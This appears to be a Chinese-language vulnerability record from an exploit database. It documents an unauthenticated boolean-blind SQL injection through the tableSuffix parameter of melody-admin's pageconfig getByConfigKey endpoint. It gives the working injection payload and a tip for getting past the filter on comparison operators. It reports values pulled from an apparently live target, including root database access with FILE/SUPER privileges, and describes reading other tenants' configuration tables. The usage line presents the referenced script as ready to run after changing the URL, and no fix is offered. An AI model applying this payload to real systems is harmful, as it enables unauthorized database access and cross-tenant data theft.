# melody-admin pageconfig tableSuffix 未授权布尔盲注（MySQL root，跨租户分表切换）

- **code**: import-requests-url-https-target-melody-admin-pageconfig
- **kind**: poc
- **category**: sqli
- **component**: melody-admin / SpringBoot + MyBatis
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 https://example.com/melody-admin 实测：无 token 请求 getByConfigKey?configKey=admin_config&tableSuffix=001,(select 1 where (1=1))x# 返回 code 0 与 webConfigId=4948 记录；同参数 (1=2) 返回 data:null。盲注取回 database()=melody_db_awt1、user()=root@203.0.113.44、version()=8.0.40、@@secure_file_priv=NULL，root@'%' FILE/SUPER=True；tableSuffix=001/002/003/015 分别返回不同租户配置。
- **tags**: sqli,blind,mysql,unauth,pageconfig,multi-tenant
- **created_at**: 2026-10-19T18:35:07.315Z
- **found_by**: exploit

## 描述

管理端 /pageconfig/pageconfig/getByConfigKey 与 AdminPageConfig 的 tableSuffix 参数直接拼进 FROM 子句表名，接口不校验 token。用派生表布尔条件 `001,(select 1 where (cond))x#` 二分；`>`/`<` 被过滤返回 500，必须用 between。同参数可切分表跨租户读配置。

## 用法

```
python poc.py  # 改 URL 后可直接跑；q("1=1") 为 True、q("1=2") 为 False 即命中
```
